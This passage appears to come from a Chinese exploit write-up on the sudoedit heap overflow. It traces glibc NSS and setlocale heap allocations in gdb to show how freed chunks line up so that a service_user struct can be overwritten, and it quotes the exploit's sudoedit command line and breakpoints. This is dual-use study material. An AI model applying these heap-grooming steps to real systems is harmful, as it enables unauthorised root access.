      if (result == NULL)
        return NULL;
      /* Save the database name.  */
      memcpy (result->name, name, len);//result->name的值就是每行开头的词
      /* Parse the list of services.  */
      result->service = nss_parse_service_list (line);//此处就会创建service_user结构体,并且line已经指向"："后面的字符了
      result->next = NULL;
      return result;
    }
附带上`name_database_entry`结构体声明
    //glibc-2.31\nss\nsswitch.h
    typedef struct name_database_entry
    {
      /* And the link to the next entry.  */
      struct name_database_entry *next;
      /* List of service to be used.  */
      service_user *service;
      /* Name of the database.  */
      char name[0];
    } name_database_entry;
每一行冒号前面的单词会对应一个`name_database_entry`结构体，结构体包含两个指针以及一个字符数组。两个指针固定为0x10大小，当单词的长度小于8字节（算上结束字符最多8字节）的时候，申请的chunk大小仅为0x20。  
原理是：  
前面0x10是chunk本身的`prev_size`和`size`  
后面0x10是`name_database_entry`结构体的两个指针，分别是`service`和`next`。  
而`name`就会占用后面chunk的`prev_size`字段，因为当前chunk在使用时，紧跟着的chunk的prev_size是无效字段，因此可以被前一个chunk所占用，所以当单词的长度小于8字节时，可以仅申请`0x20`大小的chunk。  
**PS:但是存在特殊情况，比如剩余的空闲chunk大小为0x30，那么不会拆分0x20大小的chunk，而是直接分配0x30的chunk，因为如果拆分0x20的chunk，剩余大小为0x10，并不能形成一个新的chunk。重点！后面要考！！**
###  4.3 nss_parse_service_list
    //glibc-2.31\nss\nsswitch.c
    static service_user *
    nss_parse_service_list (const char *line)
    {
      service_user *result = NULL, **nextp = &result;
      while (1)
        {
          service_user *new_service;
          const char *name;
          while (isspace (line[0]))
      ++line;//跳过空字符
          if (line[0] == '\0')
      /* No source specified.  */
      return result;
          /* Read  identifier.  */
          name = line;
          while (line[0] != '\0' && !isspace (line[0]) && line[0] != '[')//找寻第一个单词，不同单词通过空格分隔
      ++line;
          if (name == line)
      return result;
          new_service = (service_user *) malloc (sizeof (service_user)
                   + (line - name + 1));//申请了用于存放service_user结构体的堆内存。
附带上service_user结构体声明
    //glibc-2.31\nss\nsswitch.h
    typedef struct service_user
    {
      /* And the link to the next entry.  */
      struct service_user *next;
      /* Action according to result.  */
      lookup_actions actions[5];
      /* Link to the underlying library object.  */
      service_library *library;
      /* Collection of known functions.  */
      void *known;
      /* Name of the service (`files', `dns', `nis', ...).  */
      char name[0];
    } service_user;
不算`name`字段，也就是`sizeof(service_user)=0x30`，那么申请chunk大小计算原理同`name_database_entry`一样，当name的长度小于等于8，可仅申请0x40大小的chunk。而/etc/nsswitch.conf中大多数单词长度都是小于8的。
###  4.4 需要覆盖的service_user结构体
根据参考文档中描述的，当调用完`set_cmnd`函数后，紧跟着执行的nss_load_library(servcie_user
*ni)时，ni是指向的group行的第一个单词对应的service_user结构体，也就是files，当然有些参考文档中写去内存中查找systemd字符串，这样其实覆盖的长度就大了，具体因配置文件而异。
    group:          files systemd
## 5 参考exp的堆布局
大体分为三部分
  1. 1.setlocale：进行chunk占用并释放。
  2. 2.nss_parse_file：调整堆布局，并构造好service_user结构体。
  3. 3.漏洞利用点，申请到我们想要的chunk，进行堆溢出覆盖service_user。  
exp代码中通过execve执行的命令类似于
        env -i LC_ALL=C.UTF-8@+"C"*212 sudoedit -s 56*'A'+'\' '\' 54*'B'+'\'
###  5.1 setlocale部分
开启调试
        sudo gdb -q --args ./sudo-hax-me-a-sandwich 1
gdb命令
        pwndbg> directory ../glibc-2.31/locale
    pwndbg> directory ../glibc-2.31/nss
    b execve
    r
    b setlocale
    c
下面的调用流程就是不断执行continue命令看到的顺序。
**5.1.1 setlocale(LC_ALL,””)** 代码中设置的LC _ALL=C.UTF-8@+”C”*212。  
所以LC_申请的chunk的data部分大小是8+212+1=221=0xdd，再加上chunk的头部prev
_size和size，因此chunk大小是0xed，再地址对齐，最终chunk大小是0xf0。  
执行到下一个setlocale函数执行前，查看当前setlocale执行后的结果。  
这次是在堆中申请空间存储各LC_的值，并将字符串指针存入`_nl_global_locale.__names`。  
所有的chunk大小都为0xf0，可以自行查看。  
记录下每个chunk的data部分的指针地址。
        LC_CTYPE = 0x55dab3d18da0
    LC_NUMERIC = 0x55dab3d18180
    LC_TIME = 0x55dab3d177f0
    LC_COLLATE = 0x55dab3d169a0
    LC_MONETARY = 0x55dab3d15fb0
    LC_MESSAGES = 0x55dab3d15610
    LC_ALL = 0x55dab3d18e90
    LC_PAPER = 0x55dab3d14180
    LC_NAME = 0x55dab3d13810
    LC_ADDRESS = 0x55dab3d12f00
    LC_TELEPHONE = 0x55dab3d12540
    LC_MEASUREMENT = 0x55dab3d11bb0
    LC_IDENTIFICATION = 0x55dab3d103e0
**5.1.2 setlocale(LC_ALL,NULL)** 获取LC_ALL的值。  
**5.1.3 setlocale(LC_ALL,”C”)**
执行过后查看bins的情况。
unsortedbin有未显示完的，只能单独看了。
此时`_nl_global_locale.__names`都是C了。
简述下过程，由于将`LC_ALL`都设置为”C”，从`LC_CTYPE`开始依次释放，但是会跳过`LC_ALL`，`LC_ALL`是最后释放的。由于tcachebin的大小为7，所以是`LC_CTYPE`（tcache尾部）~`LC_PAPER`（tcache头部）。  
而剩余的释放之后其实是进入fastbin的，但由于是在下一个setlocale执行前查看的bins，中间经过了malloc的调用，当申请的chunk未在fastbin中直接获取，会将fastbin中的chunk放入unsortedbin，也就是我们查看到的效果了。  
一个较大的bin之后也是会用到的，因此这里记录下其chunk的首地址：`0x55dab3d19100`
**5.1.4 setlocale(LC_ALL,saved_LC_ALL)**
LC_的各值又重新被赋值为”C.UTF-8[@CCC](https://github.com/CCC
"@CCC")..”，查看`_nl_global_locale.__names`的值。
    LC_CTYPE = 0x55dab3d12540 
    LC_NUMERIC = 0x55dab3d11bb0 
    LC_TIME = 0x55dab3d103e0 
    LC_COLLATE = 0x55dab3d18e90 
    LC_MONETARY = 0x55dab3d12f00 
    LC_MESSAGES = 0x55dab3d18da0 
    LC_ALL = 0x55dab3d19220 
    LC_PAPER = 0x55dab3d18180 
    LC_NAME = 0x55dab3d177f0 
    LC_ADDRESS = 0x55dab3d169a0 
    LC_TELEPHONE = 0x55dab3d15fb0 
    LC_MEASUREMENT = 0x55dab3d15610 
    LC_IDENTIFICATION = 0x55dab3d14180
可以发现基本还是原先的chunk，不过位置变了，但是LC_ALL使用的chunk是之前不存在的，而原先LC_NAME的chunk不见了。  
简述下过程：
  1. 1.在给各个LC_的值分配chunk之前，先申请过一个0x110大小的chunk（具体在哪已经忘记了），此时会从unsortedbin中寻找，那个较大的chunk就被切割分配出去了，剩余部分放入largebin，unsortedbin中其他的则都是进入smallbin中（0xf0大小）。
  2. 2.又申请了0x20大小的chunk，此时从smallbin中取一个chunk（LC_NAME）进行分割，剩余0xd0的放入unsortedbin。
  3. 3.之后申请0xf0的chunk，会先从tcachebin中取，取完之后去unsortedbin中查看，发现没有可用的，将0xd0的chunk放入smallbin，然后去smallbin的0xf0列表中取，但是最终会少一个0xf0大小的chunk给LC_ALL。
  4. 4.从largebin中分割一块给LC_ALL，剩余的放入unsortedbin。  
之前较大的chunk首地址是：`0x55dab3d19100`，加上0x110，则对应chunk地址是`0x55dab3d19210`，所以data部分地址是`0x55dab3d19220`，与我们看到的结果一致，剩余放入unsortedbin的首地址就是0x55dab3d19210+0xf0=`0x55dab3d19300`。  
查看下当前bins。  
**5.1.5 setlocale(LC_ALL,NULL)**
获取LC_ALL的值，同上。
**5.1.6 setlocale(LC_ALL,”C”)**
又会把那些chunk释放出来。
**5.1.7 setlocale(LC_ALL,saved_LC_ALL)**
此处是nss_parse_file函数执行前最后一次调用setlocale，需要在后续继续设置断点,断点含义下节说明。
    pwndbg>b nsswitch.c:576
    pwndbg>b nsswitch.c:790
    pwndbg>b nsswitch.c:641
此时又会重新申请掉那些0xf0大小的chunk，此时因为现在tcachebin中有最初从LC_NAME中分割的0x20大小的chunk，不会再切割0xf0大小的chunk了，所以还是那些chunk，只是顺序改变。
###  5.2 nss_parse_file部分
解释上节断点的设置。
    //glibc-2.31\nss\nsswitch.c
    576：n = __getline (&line, &len, fp);//在nss_parse_file函数中，每次读取一行配置文件/etc/nsswitch.conf的内容。
    790：result = (name_database_entry *) malloc (sizeof (name_database_entry) + len);//在nss_getline函数中，为每个有效行的冒号前面的单词对应一个name_database_entry结构体。
    641：new_service = (service_user *) malloc (sizeof (service_user)//为每行冒号后的每个单词生成一个service_user结构体。
下面跟踪主要是堆块的申请，仅跟踪到group行分配的第一个service_user为止，因为这个结构体就是漏洞点堆溢出要覆盖的。
**5.2.1 为读取/etc/nsswitch.conf每行数据申请一个chunk**
第一次执行__getline之前，line是NULL
执行过后
会分配一个0x80大小的chunk，之后就用这个chunk来存储每次读取到的一行的数据。该chunk是从那个较大的chunk中分割出来的，首地址是`0x55dab3d19300`。  
剧透一下，后续`user_args`申请的chunk就是现在`0x55dab3d19300`这块，而group行申请的第一个service_user结构体所使用的chunk就是紧跟之后的，首地址是`0x55dab3d19380`。  
之后一直执行到line读取到第一个有效行，也就是passwd行。
**5.2.2 passwd行申请name_database_entry**
申请data部分长度是0x17（0x10+passwd字符串长度为7）  
查看当前bins
按照之前的理论，0x17仅需分配0x20大小的chunk，现在tcachebins和fastbins中都不存在正好的，unsortedbin为空，所以会去取smallbin中0xd0大小的chunk(之前从LC_NAME的chunk中分割出来的)进行分割，剩余的放入unsortedbin。
malloc执行之后的bins布局。
当赋值完之后，查看一下name_database_entry结构体内容。
    pwndbg> p *(struct name_database_entry*)(0x55dab3d13830)
**5.2.3 passwd行申请第一个service_user结构体**
申请大小为0x36（0x30+files字符串长度为6），根据理论仅需要0x40大小的chunk即可。
分配之前的bins布局。
tcachebin和fastbin没有正好0x40大小的chunk，而unsortedbin中存在一个chunk，且大小足以满足，因此从该chunk中切割出0x40进行分配，剩余的继续留在unsortedbin中。
分配的service_user的首地址是0x55dab3d13850，查看分配之后的bins布局。
    pwndbg> p *(struct service_user*)(0x55dab3d13850)
**5.2.4 passwd行申请第二个service_user结构体**
第二个单词为systemd，字符串长度为8，对应的chunk大小仍然为0x40。因此还是从之前的unsortedbin中分割。  
直接查看结果。
分配之后的bins布局，需要注意的是unsortedbin中剩余的chunk大小为0x30了。
**5.2.5 group行name_database_entry**
malloc申请的大小为0x16，一般0x20的chunk即可满足，但是tcachebin和fastbin中不存在相应大小的chunk，再次去unsortedbin中，而unsortedbin中剩余的chunk仅0x30大小，切割0x20大小出来，剩余0x10无法形成一个chunk，因此整个0x30都分配出去了。
分配前的bins布局
分配后name_database_entry结构体的地址
查看chunk大小
分配后的bins布局，unsortedbin清空了。
查看name_database_entry
**5.2.6 group行申请第一个service_user结构体**
malloc申请0x36，对应chunk为0x40。
分配前的bins布局
tcachebin和fastbin中不存在0x40大小的chunk，unsortedbin为空，因此从largebins中切割一块出来，而largebins中这块chunk之前是为了给读取每行数据时，申请0x80的chunk所切割出来的，也就是说group行的第一个service_user结构体在内存空间上是紧跟在line所在chunk的后面的。
而nss_parse_file的最后，会执行free(line)的操作，因此后续只要在申请user_args时，申请到line释放的chunk，就可以覆盖service_user的结构体了。
line对应chunk首地址是：0x55dab3d19300  